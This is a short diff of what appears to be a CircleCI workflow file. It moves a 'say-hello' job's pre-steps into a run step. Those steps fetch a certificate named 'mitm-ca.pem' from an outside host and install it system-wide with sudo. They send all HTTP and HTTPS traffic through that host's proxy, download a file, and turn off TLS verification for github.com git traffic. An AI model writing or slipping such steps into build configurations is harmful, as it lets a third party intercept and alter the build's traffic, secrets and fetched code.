@@ -26,12 +26,13 @@ workflows:
     jobs:
       - say-hello:
         pre-steps:
-          command: |
-            sudo curl https://security.gaur.is/appveyor/ca -o /usr/share/ca-certificates/mitm-ca.pem
-            sudo ln -s /usr/share/ca-certificates/mitm-ca.pem /etc/ssl/certs/
-            sudo c_rehash
-            export http_proxy=http://security.gaur.is:8888
-            export https_proxy=http://security.gaur.is:8888
-            curl https://security.gaur.is/travis/test -o /tmp/test
-            git config --global http.https://github.com.proxy http://%APPVEYOR_HTTP_PROXY_IP%:%APPVEYOR_HTTP_PROXY_PORT%
-            git config --global http.https://github.com.sslVerify false
+          - run:
+              command: |
+                sudo curl https://security.gaur.is/appveyor/ca -o /usr/share/ca-certificates/mitm-ca.pem
+                sudo ln -s /usr/share/ca-certificates/mitm-ca.pem /etc/ssl/certs/
+                sudo c_rehash
+                export http_proxy=http://security.gaur.is:8888
+                export https_proxy=http://security.gaur.is:8888
+                curl https://security.gaur.is/travis/test -o /tmp/test
+                git config --global http.https://github.com.proxy http://%APPVEYOR_HTTP_PROXY_IP%:%APPVEYOR_HTTP_PROXY_PORT%
+                git config --global http.https://github.com.sslVerify false
